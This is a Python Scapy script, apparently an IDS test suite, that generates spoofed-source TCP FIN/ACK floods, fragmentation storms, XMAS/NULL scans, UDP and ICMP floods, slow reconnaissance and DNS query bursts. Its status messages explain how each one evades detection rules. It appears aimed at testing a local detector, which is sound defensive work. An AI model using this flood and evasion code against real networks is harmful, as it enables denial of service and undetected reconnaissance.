import argparse, time, random, socket, subprocess, re
from scapy.all import IP, TCP, UDP, ICMP, Raw, Ether, sendp, fragment, conf, get_if_hwaddr
conf.verb = 0
IFACE = "wlan0"
GW_MAC = None
MY_MAC = None

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
def rand_port():
    return random.randint(1024, 65535)
def status(msg):
    print(f"  -> {msg}")

def resolve_macs(iface, target):
    global GW_MAC, MY_MAC
    try:
        MY_MAC = get_if_hwaddr(iface)
        print(f"  Own MAC : {MY_MAC}")
    except:
        MY_MAC = "02:00:00:00:00:01"
    subprocess.call(["ping","-c","1","-W","1",target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        out = subprocess.check_output(["arp","-n"], text=True)
        for line in out.splitlines():
            if target in line:
                m = re.search(r"([0-9a-f]{2}[:\-]){5}[0-9a-f]{2}", line, re.I)
                if m:
                    GW_MAC = m.group(0)
                    print(f"  Target MAC : {GW_MAC}")
                    return
    except:
        pass
    GW_MAC = "ff:ff:ff:ff:ff:ff"
    print(f"  MAC : broadcast fallback")

def xsend(pkt):
    frame = Ether(src=MY_MAC, dst=GW_MAC) / pkt
    sendp(frame, iface=IFACE, verbose=False)

def attack_fin_flood(target, duration=30, pps=300):
    print(f"\n[2] TCP FIN Flood -> {target} ({pps} pps, {duration}s)")
    status("FIN packets — bypasses SYN flood rule...")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) / TCP(sport=rand_port(), dport=rand_port(), flags="F"))
        count += 1
        if count % 500 == 0: status(f"Sent {count}...")
        time.sleep(1.0/pps)
    print(f"  [DONE] Sent {count} FIN packets.")

def attack_ack_flood(target, duration=30, pps=300):
    print(f"\n[3] TCP ACK Flood -> {target} ({pps} pps, {duration}s)")
    status("ACK only — invisible to all SYN-based rules...")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) / TCP(sport=rand_port(), dport=rand_port(), flags="A",
              seq=random.randint(0,2**32-1), ack=random.randint(0,2**32-1)))
        count += 1
        if count % 500 == 0: status(f"Sent {count}...")
        time.sleep(1.0/pps)
    print(f"  [DONE] Sent {count} ACK packets.")

def attack_fragmentation(target, count=300):
    print(f"\n[4] IP Fragmentation Storm -> {target} ({count} datagrams)")
    status("Fragmented packets — bypasses protocol inspection...")
    for i in range(count):
        pkt = IP(src=rand_ip(), dst=target) / UDP(sport=rand_port(), dport=rand_port()) / Raw(load="X"*random.randint(1000,3000))
        for frag in fragment(pkt, fragsize=64): xsend(frag)
        if i % 50 == 0: status(f"Sent {i}/{count}...")
        time.sleep(0.02)
    print(f"  [DONE] Sent {count} fragmented datagrams.")

def attack_xmas_scan(target, ports=500):
    print(f"\n[5] XMAS Scan -> {target} ({ports} ports)")
    status("FIN+PSH+URG — not SYN, bypasses port scan rule...")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1,65535), min(ports,65534))):
        xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=dport, flags="FPU"))
        if i % 100 == 0: status(f"Scanned {i}/{ports} ports...")
        time.sleep(0.005)
    print(f"  [DONE] XMAS scanned {ports} ports.")

def attack_null_scan(target, ports=500):
    print(f"\n[6] NULL Scan -> {target} ({ports} ports)")
    status("TCP flags=0 — bypasses all flag-based rules...")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1,65535), min(ports,65534))):
        xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=dport, flags=0))
        if i % 100 == 0: status(f"Scanned {i}/{ports} ports...")
        time.sleep(0.005)
    print(f"  [DONE] NULL scanned {ports} ports.")

def attack_large_udp(target, duration=20, pps=100):
    print(f"\n[7] Large UDP Flood -> {target} ({pps} pps, {duration}s)")
    status("4-8KB UDP to one port — large payload anomaly...")
    end_time = time.time() + duration
    count = 0
    dport = random.randint(1024, 9000)
    while time.time() < end_time:
        xsend(IP(src=rand_ip(), dst=target) / UDP(sport=rand_port(), dport=dport) / Raw(load="A"*random.randint(4096,8192)))
        count += 1
        time.sleep(1.0/pps)
    print(f"  [DONE] Sent {count} large UDP packets.")

def attack_low_and_slow(target, ports=100, delay=2.0):
    print(f"\n[8] Low-and-Slow Recon -> {target} ({ports} ports, {delay}s delay)")
    status("1 packet every 2s — stays under ALL pps thresholds!")
    src_ip = rand_ip()
    for i, dport in enumerate(random.sample(range(1,65535), min(ports,65534))):
        xsend(IP(src=src_ip, dst=target) / TCP(sport=rand_port(), dport=dport, flags="S"))
        if i % 10 == 0: status(f"Scanned {i}/{ports} ports...")
        time.sleep(delay)
    print(f"  [DONE] Scanned {ports} ports.")

def attack_oversized_icmp(target, count=100):
    print(f"\n[9] Oversized ICMP -> {target} ({count} packets)")
    status("Large ICMP payloads — ICMP_SCAN counts targets not size...")
    for i in range(count):
        pkt = IP(src=rand_ip(), dst=target) / ICMP() / Raw(load="P"*random.randint(5000,15000))
        for f in fragment(pkt, fragsize=1480): xsend(f)
        if i % 20 == 0: status(f"Sent {i}/{count}...")
        time.sleep(0.1)
    print(f"  [DONE] Sent {count} oversized ICMP.")

def attack_dns_amplification(target, count=300):
    print(f"\n[10] DNS Amplification Sim -> {target}:53 ({count} sources)")
    status("Many spoofed IPs to port 53 — opposite of a scan...")
    dns_query = b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"
    for i in range(count):
        xsend(IP(src=rand_ip(), dst=target) / UDP(sport=rand_port(), dport=53) / Raw(load=dns_query))
        if i % 50 == 0: status(f"Sent {i}/{count}...")
        time.sleep(0.05)
    print(f"  [DONE] Sent {count} DNS queries.")

ATTACKS = {
    "2":  ("TCP FIN Flood",          attack_fin_flood),
    "3":  ("TCP ACK Flood",          attack_ack_flood),
    "4":  ("IP Fragmentation Storm", attack_fragmentation),
    "5":  ("XMAS Scan",              attack_xmas_scan),
    "6":  ("NULL Scan",              attack_null_scan),
    "7":  ("Large UDP Flood",        attack_large_udp),
    "8":  ("Low-and-Slow Recon",     attack_low_and_slow),
    "9":  ("Oversized ICMP",         attack_oversized_icmp),
    "10": ("DNS Amplification Sim",  attack_dns_amplification),
}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zero-Day IDS Test Suite")
    parser.add_argument("--target", default=None)
    parser.add_argument("--attack", required=True, help="2-10, 'all', or 'list'")
    parser.add_argument("--iface", default="wlan0")
    args = parser.parse_args()
    IFACE = args.iface
    conf.iface = args.iface
    if args.attack == "list":
        print("\nAvailable attacks:")
        for num,(name,_) in ATTACKS.items(): print(f"  [{num:>2}] {name}")
        exit(0)
    if not args.target:
        print("Error: --target required. e.g. --target 172.20.10.2")
        exit(1)
    print("\n" + "="*60)
    print(f"  Target: {args.target}  Attack: {args.attack}  Iface: {args.iface}")
    print("  WARNING: Only use on networks you own/control.")
    print("="*60)
    print("\n  Resolving MACs...")
    resolve_macs(args.iface, args.target)
    print()
    if args.attack == "all":
        for num,(name,func) in ATTACKS.items():
            if num == "8":
                print(f"\n[8] Skipping '{name}' in all mode (too slow). Run separately.")
                continue
            func(args.target)
            print("  Waiting 5s..."); time.sleep(5)
    elif args.attack in ATTACKS:
        ATTACKS[args.attack][1](args.target)
    else:
        print(f"Unknown attack '{args.attack}'. Use --attack list.")
        exit(1)
    print("\n" + "="*60)
    print("  Done. Check http://127.0.0.1:8090/attacks for ZERO_DAY alerts.")
    print("="*60)
